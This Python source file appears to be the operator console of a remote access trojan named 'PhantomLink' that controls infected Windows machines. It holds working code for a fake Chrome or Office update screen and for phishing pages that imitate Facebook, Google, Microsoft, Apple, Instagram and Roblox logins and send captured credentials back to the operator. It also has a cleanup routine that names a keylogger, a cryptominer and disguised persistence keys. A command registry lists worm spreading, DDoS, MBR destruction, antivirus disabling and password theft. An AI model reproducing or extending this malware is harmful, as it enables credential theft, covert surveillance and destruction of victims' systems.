        html_content = '''<!DOCTYPE html><html><head><title>Chrome Update</title><style>body{background:white;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.container{text-align:center;max-width:400px}.chrome-logo{width:100px;height:100px;margin-bottom:30px}h2{color:#333;margin:20px 0}.progress{width:300px;height:6px;background:#e0e0e0;border-radius:3px;margin:20px auto;overflow:hidden}.progress-bar{height:100%;background:#4285f4;width:0%;animation:progress 300s linear forwards}keyframes progress{to{width:100%}}</style></head><body><div class="container"><svg class="chrome-logo" viewBox="0 0 100 100"><circle cx="50" cy="50" r="45" fill="#4285f4"/><circle cx="50" cy="50" r="30" fill="white"/><circle cx="50" cy="50" r="20" fill="#4285f4"/></svg><h2>Updating Google Chrome</h2><p>Please wait while Chrome updates to the latest version...</p><div class="progress"><div class="progress-bar"></div></div><p id="status">Downloading update...</p></div><script>setTimeout(()=>document.getElementById("status").textContent="Installing update...",30000);setTimeout(()=>document.getElementById("status").textContent="Finishing up...",60000)</script></body></html>'''
    else:
        html_content = '''<!DOCTYPE html><html><head><title>Office Update</title><style>body{background:#f3f3f3;font-family:"Segoe UI",sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.container{background:white;padding:50px;border-radius:8px;box-shadow:0 4px 6px rgba(0,0,0,0.1);text-align:center}h2{color:#d83b01}.spinner{border:4px solid #f3f3f3;border-top:4px solid #d83b01;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:20px auto}keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style></head><body><div class="container"><h2>Microsoft Office</h2><div class="spinner"></div><p>Updating Office applications...</p><p>This may take several minutes</p></div></body></html>'''
    html_escaped = html_content.replace("'", "''")

    command2 = f'powershell -Command "$html = \'{html_escaped}\'; $htmlPath = \\\"$env:TEMP\\\\update.html\\\"; $html | Out-File -FilePath $htmlPath -Encoding UTF8; Start-Process msedge -ArgumentList \\\"--kiosk $htmlPath --edge-kiosk-type=fullscreen\\\" -WindowStyle Normal; Start-Sleep {int(duration) * 60}; Stop-Process -Name msedge -Force -ErrorAction SilentlyContinue; Stop-Process -Name chrome -Force -ErrorAction SilentlyContinue; Remove-Item $htmlPath -Force"'
    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"[FAKE UPDATE] [{ctx.username}] {update_type} update screen shown for {duration} minutes")
        ctx.client['command_in_progress'] = False

def _cmd_fakelogin(ctx: CmdContext) -> Optional[str]:
    platform = input("Platform (facebook/google/microsoft/apple/instagram/roblox): ").lower()
    login_templates = {
        'facebook': {'title': 'Facebook',

                     'logo': '<div style="font-size:48px;color:#1877f2;font-weight:bold;">facebook</div>',

                     'placeholder_email': 'Email or phone number', 'placeholder_pass': 'Password',

                     'button': 'Log In', 'color': '#1877f2'},

        'google': {'title': 'Sign in - Google Accounts',

                   'logo': '<svg width="75" height="24"><path fill="#4285F4" d="M0,12 C0,5.4,5.4,0,12,0 C15.2,0,18.1,1.2,20.3,3.2 L17,6.5 C15.6,5.2,13.9,4.5,12,4.5 C7.7,4.5,4.2,8,4.2,12.2 C4.2,16.4,7.7,19.9,12,19.9 C15.8,19.9,18.8,17.3,19.4,13.9 L12,13.9 L12,9.4 L24,9.4 C24.2,10.6,24.2,11.8,24.2,13 C24.2,19.4,19.8,24,12,24 C5.4,24,0,18.6,0,12"></path></svg>',

                   'placeholder_email': 'Email or phone', 'placeholder_pass': 'Enter your password',

                   'button': 'Next', 'color': '#1a73e8'},

        'microsoft': {'title': 'Sign in to your Microsoft account',

                      'logo': '<div style="font-size:24px;color:#000;"><span style="color:#f25022;">■</span><span style="color:#7fba00;">■</span><br><span style="color:#00a4ef;">■</span><span style="color:#ffb900;">■</span> Microsoft</div>',

                      'placeholder_email': 'Email, phone, or Skype', 'placeholder_pass': 'Password',

                      'button': 'Sign in', 'color': '#0067b8'},

        'apple': {'title': 'Sign in with your Apple ID',

                  'logo': '<svg width="40" height="48" fill="#000"><path d="M31.8,24.8c-0.1-5.3,4.3-7.9,4.5-8c-2.5-3.6-6.3-4.1-7.6-4.2c-3.2-0.3-6.3,1.9-7.9,1.9c-1.6,0-4.2-1.9-6.9-1.8c-3.5,0.1-6.8,2.1-8.6,5.2c-3.7,6.4-0.9,15.8,2.6,21c1.7,2.5,3.8,5.4,6.5,5.3c2.6-0.1,3.6-1.7,6.7-1.7c3.1,0,4,1.7,6.9,1.6c2.8,0,4.6-2.6,6.3-5.2c2-2.9,2.8-5.8,2.9-5.9C36.1,32.9,31.9,30.9,31.8,24.8z M27.3,10.5c1.4-1.7,2.4-4.1,2.1-6.5c-2,0.1-4.5,1.4-6,3c-1.3,1.5-2.4,3.9-2.1,6.2C23.6,13.4,25.9,12.2,27.3,10.5z"/></svg>',

                  'placeholder_email': 'Apple ID', 'placeholder_pass': 'Password', 'button': 'Continue',

                  'color': '#000'},

        'instagram': {'title': 'Instagram',

                      'logo': '<div style="font-size:48px;font-family:Brush Script MT,cursive;">Instagram</div>',

                      'placeholder_email': 'Phone number, ctx.username, or email',

                      'placeholder_pass': 'Password', 'button': 'Log in', 'color': '#e1306c'},

        'roblox': {'title': 'Roblox Login',

                   'logo': '<div style="font-size:42px;font-weight:bold;color:#fff;background:#000;padding:10px 20px;border-radius:8px;">ROBLOX</div>',

                   'placeholder_email': 'Username or Email', 'placeholder_pass': 'Password',

                   'button': 'Login', 'color': '#00a2ff'}

    }

    if platform not in login_templates:
        print("[!] Invalid platform")
        return "continue"

    template = login_templates[platform]
    html = f'''<!DOCTYPE html><html><head><title>{template["title"]}</title><style>*{{margin:0;padding:0;box-sizing:border-box}}body{{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh}}.container{{background:white;padding:40px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1),0 8px 16px rgba(0,0,0,0.1);width:400px;text-align:center}}.logo{{margin-bottom:30px}}input{{width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:6px;font-size:16px}}input:focus{{outline:none;border-color:{template["color"]}}}button{{width:100%;padding:14px;margin-top:16px;border:none;border-radius:6px;background:{template["color"]};color:white;font-size:16px;font-weight:bold;cursor:pointer}}button:hover{{opacity:0.9}}.error{{color:#d93025;font-size:14px;margin-top:10px;display:none}}</style></head><body><div class="container"><div class="logo">{template["logo"]}</div><form id="loginForm"><input type="text" id="email" placeholder="{template["placeholder_email"]}" required><input type="password" id="password" placeholder="{template["placeholder_pass"]}" required><div class="error" id="error">Incorrect password. Try again.</div><button type="submit">{template["button"]}</button></form></div><script>let attempts=0;document.getElementById("loginForm").onsubmit=function(e){{e.preventDefault();const email=document.getElementById("email").value;const password=document.getElementById("password").value;const credentials=email+":"+password+"\\n";const blob=new Blob([credentials],{{type:"text/plain"}});const a=document.createElement("a");a.href=URL.createObjectURL(blob);a.download="credentials_{platform}.txt";a.click();attempts++;if(attempts<3){{document.getElementById("error").style.display="block";document.getElementById("password").value="";document.getElementById("password").focus()}}else{{alert("Too many failed attempts. Please try again later.");window.close()}}}}</script></body></html>'''
    html_escaped = html.replace("'", "''")
    command2 = f'powershell -Command "$html = \'{html_escaped}\'; $htmlPath = \\\"$env:TEMP\\\\login_{platform}.html\\\"; $html | Out-File -FilePath $htmlPath -Encoding UTF8; Start-Process $htmlPath; Start-Sleep 300; $credFile = \\\"$env:USERPROFILE\\\\Downloads\\\\credentials_{platform}.txt\\\"; if (Test-Path $credFile) {{ $creds = Get-Content $credFile; Remove-Item $credFile -Force; Write-Output \\\"Captured: $creds\\\" }} else {{ Write-Output \\\"No credentials captured\\\" }}; Remove-Item $htmlPath -Force"'
    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        output = response.decode('utf-8', errors='ignore')
        print(output)
        if "Captured:" in output:
            ctx.logger(f"[PHISHING] [{ctx.username}] ✓ {platform} credentials captured!\n{output}")
        else:
            ctx.logger(f"[PHISHING] [{ctx.username}] {platform} prompt shown")
        ctx.client['command_in_progress'] = False

def _cmd_logoff(ctx: CmdContext) -> Optional[str]:
    command2 = 'shutdown /l /f'
    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        ctx.logger(f'Logging off [{ctx.username}] . . . .')
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"Client [{ctx.username}] Logged off\n\n{response.decode('utf-8', errors='ignore')}")
    ctx.client['command_in_progress'] = False

def _cmd_selfdestruct(ctx: CmdContext) -> Optional[str]:
    confirm = input("This will COMPLETELY REMOVE PhantomLink from the ctx.client. Type 'REMOVE' to confirm: ")
    if confirm != 'REMOVE':
        print("[!] Self-destruct cancelled")
        return "continue"

    ctx.logger(f"[!] Self-destructing PhantomLink on [{ctx.username}]...")
    print(f"[*] Removing PhantomLink from {ctx.username}...")

    # Step 1: Kill related processes (screener, keylogger)
    command_kill = 'taskkill /f /im screener.exe & taskkill /f /im keylogger.exe & taskkill /f /im xmrig.exe'
    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command_kill}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(f"[1/4] Kill processes: {response.decode('utf-8', errors='ignore')}")

    # Step 2: Remove registry startup entries
    command_reg = (
        'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Windows Defender Updater" /f & '
        'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Screen Optimizer" /f'
    )
    with ctx.client['lock']:
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command_reg}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(f"[2/4] Remove registry: {response.decode('utf-8', errors='ignore')}")

    # Step 3: Delete all files
    command_clean = (
        'del /f /q "%USERPROFILE%\\screenshot.png" 2>nul & '
        'del /f /q "%USERPROFILE%\\webcam.jpg" 2>nul & '
        'del /f /q "%USERPROFILE%\\screen.mp4" 2>nul & '
        'del /f /q "%USERPROFILE%\\mic.wav" 2>nul & '
        'rd /s /q "%APPDATA%\\MicrosoftUpdate" 2>nul'
    )
    with ctx.client['lock']:
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command_clean}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(f"[3/4] Delete files: {response.decode('utf-8', errors='ignore')}")

    # Step 4: Kill self (defender.exe)
    command_selfkill = (
        'powershell -Command "Start-Sleep 2; '
        'Stop-Process -Name defender -Force -ErrorAction SilentlyContinue; '
        'Stop-Process -Name PhantomLink -Force -ErrorAction SilentlyContinue"'
    )
    with ctx.client['lock']:
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command_selfkill}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(f"[4/4] Kill self: {response.decode('utf-8', errors='ignore')}")

    ctx.client['command_in_progress'] = False
    print(f"[+] PhantomLink removed from {ctx.username}")
    ctx.logger(f"[+] PhantomLink REMOVED from [{ctx.username}] - Self-destruct complete")

# ---------------------------------------------------------------------------
# Registry singleton — populated at import time (Empire-style discovery point)
# ---------------------------------------------------------------------------
command_registry = CommandRegistry()

command_registry.register(Command("send", _cmd_send, 'File Operations',
                                  "Make the client send files to the host"))
command_registry.register(Command("get", _cmd_get, 'File Operations',
                                  "Download file/s on the client from the host's server"))
command_registry.register(Command("camera", _cmd_camera, 'Media',
                                  "Take a snapshot from the camera and send it to the host"))
command_registry.register(Command("extract", _cmd_extract, 'File Operations',
                                  "Extract a .rar file to a location"))
command_registry.register(Command("copy", _cmd_copy, 'File Operations',
                                  "Copy file"))
command_registry.register(Command("cut", _cmd_cut, 'File Operations',
                                  "Move file from one place to another"))
command_registry.register(Command("record", _cmd_record, 'Media',
                                  "Record audio from the client and send it to the host"))
command_registry.register(Command("ffmpeg", _cmd_ffmpeg, 'Utilities',
                                  "Download and setup ffmpeg"))
command_registry.register(Command("inject", _cmd_inject, 'User & Execution',
                                  "Download and execute a malware/software"))
command_registry.register(Command("user", _cmd_user, 'User & Execution',
                                  "Create a user (Admin)"))
command_registry.register(Command("hide", _cmd_hide, 'User & Execution',
                                  "Hide/Unhide PhantomLink completely from Task Manager"))
command_registry.register(Command("archive", _cmd_archive, 'File Operations',
                                  "Compress a file/folder into .zip"))
command_registry.register(Command("alert", _cmd_alert, 'User & Execution',
                                  "Send a POP-UP custom alert message"))
command_registry.register(Command("block", _cmd_block, 'System Control',
                                  "Temporarily block mouse and keyboard input"))
command_registry.register(Command("hosts", _cmd_hosts, 'Network & Internet',
                                  "Open hosts file to block / unblock websites"))
command_registry.register(Command("play", _cmd_play, 'Media',
                                  "Play an audio in the client's speaker"))
command_registry.register(Command("port", _cmd_port, 'Network & Internet',
                                  "Open a new Port-Forwarding"))
command_registry.register(Command("kill", _cmd_kill, 'User & Execution',
                                  "Kill the pc temporary (Until restart)"))
command_registry.register(Command("wallpaper", _cmd_wallpaper, 'System Control',
                                  "Change wallpaper of client's computer"))
command_registry.register(Command("rotate", _cmd_rotate, 'System Control',
                                  "Rotate the client's screen"))
command_registry.register(Command("sleep", _cmd_sleep, 'System Control',
                                  "Sleep"))
command_registry.register(Command("keylog", _cmd_keylog, 'Utilities',
                                  "Get the KeyLogger's log file"))
command_registry.register(Command("keylogger", _cmd_keylogger, 'Utilities',
                                  "Download and setup KeyLogger"))
command_registry.register(Command("screener", _cmd_screener, 'Utilities',
                                  "Install the auto screenshoter"))
command_registry.register(Command("update", _cmd_update, 'Help',
                                  "Update PhantomLink"))
command_registry.register(Command("harvest", _cmd_harvest, 'File Operations',
                                  "Auto-search and send specific file types in User-file"))
command_registry.register(Command("browser", _cmd_browser, 'System Info & Monitoring',
                                  "Extract all browser data (Passwords, Usernames/E-Mails, Cookies)"))
command_registry.register(Command("screenrec", _cmd_screenrec, 'Media',
                                  "Record screen as a video and send it"))
command_registry.register(Command("worm", _cmd_worm, 'Network & Internet',
                                  "Inject PhantomLink into all PCs on the network"))
command_registry.register(Command("ddos", _cmd_ddos, 'Network & Internet',
                                  "DDOS on specific target"))
command_registry.register(Command("dnshijack", _cmd_dnshijack, 'Network & Internet',
                                  "Forward any connection to URL into another IP"))
command_registry.register(Command("mouse", _cmd_mouse, 'System Control',
                                  "Control Mouse"))
command_registry.register(Command("type", _cmd_type, 'System Control',
                                  "Control Keyboard"))
command_registry.register(Command("killmbr", _cmd_killmbr, 'System Control',
                                  "DESTROY the PC FOREVER!"))
command_registry.register(Command("rootkit", _cmd_rootkit, 'User & Execution',
                                  "Hide/Unhide PhantomLink completely from Task Manager"))
command_registry.register(Command("mine", _cmd_mine, 'Utilities',
                                  "Cryptominer"))
command_registry.register(Command("print", _cmd_print, 'Utilities',
                                  "Hijack the printer"))
command_registry.register(Command("spam", _cmd_spam, 'System Control',
                                  "Show pop up repeatedly"))
command_registry.register(Command("sniff", _cmd_sniff, 'Network & Internet',
                                  "Capture all network traffic for specific duration"))
command_registry.register(Command("chrome_pass", _cmd_chrome_pass, 'System Info & Monitoring',
                                  "Decrypt Chrome's encrypted passwords"))
command_registry.register(Command("fakeupdate", _cmd_fakeupdate, 'System Control',
                                  "Shows fake Windows Update screen"))
command_registry.register(Command("fakelogin", _cmd_fakelogin, 'System Control',
                                  "Shows fake login Pop-Up and capture credintals"))
command_registry.register(Command("logoff", _cmd_logoff, 'System Control',
                                  "Log off the current user"))
command_registry.register(Command("selfdestruct", _cmd_selfdestruct, 'Danger Zone',
                                  "REMOVE PhantomLink completely from the client"))
command_registry.register(Command("screenshot", _cmd_screenshot, CATEGORY_MEDIA,
                                  "Take Screenshot and send it to the host"))
command_registry.register(Command("devices", _cmd_devices, CATEGORY_SYSTEM_INFO,
                                  "Shows the available devices"))
command_registry.register(Command("wifi", _cmd_wifi, CATEGORY_NETWORK,
                                  "Shows the wifi passwords"))
command_registry.register(Command("sys", _cmd_sys, CATEGORY_SYSTEM_INFO,
                                  "Shows all system info (Hardware/Software)", aliases=("system",)))
command_registry.register(Command("task", _cmd_task, CATEGORY_SYSTEM_INFO,
                                  "Shows all of the running tasks"))
command_registry.register(Command("shutdown", _cmd_shutdown, CATEGORY_SYSTEM_CONTROL,
                                  "Force Shutdown to the client", aliases=("off",)))
command_registry.register(Command("restart", _cmd_restart, CATEGORY_SYSTEM_CONTROL,
                                  "Force restart to the client"))
command_registry.register(Command("ip", _cmd_ip, CATEGORY_NETWORK,
                                  "Get the client's Public IP"))
command_registry.register(Command("lock", _cmd_lock, CATEGORY_SYSTEM_CONTROL,
                                  "Lockscreen (Client)"))
command_registry.register(Command("disable task manager", _cmd_disable_task_manager, CATEGORY_SYSTEM_CONTROL,
                                  "Disable the Task Manager"))
command_registry.register(Command("enable task manager", _cmd_enable_task_manager, CATEGORY_SYSTEM_CONTROL,
                                  "Enable the Task Manager"))
command_registry.register(Command("recycle", _cmd_recycle, CATEGORY_UTILITIES,
                                  "Empty the recycle bin"))
command_registry.register(Command("clipboard", _cmd_clipboard, CATEGORY_SYSTEM_INFO,
                                  "Show the last copied thing"))
command_registry.register(Command("rickroll", _cmd_rickroll, CATEGORY_MEDIA,
                                  "Play a Rickroll video"))
command_registry.register(Command("netscan", _cmd_netscan, CATEGORY_NETWORK,
                                  "Scan local network for devices and informations"))
command_registry.register(Command("info", _cmd_info, CATEGORY_SYSTEM_INFO,
                                  "Get all machine info"))
command_registry.register(Command("killav", _cmd_killav, CATEGORY_SYSTEM_CONTROL,
                                  "Disable Windows Defender Anti-Virus"))
command_registry.register(Command("creds", _cmd_creds, CATEGORY_SYSTEM_INFO,
                                  "Get all windows credentials"))
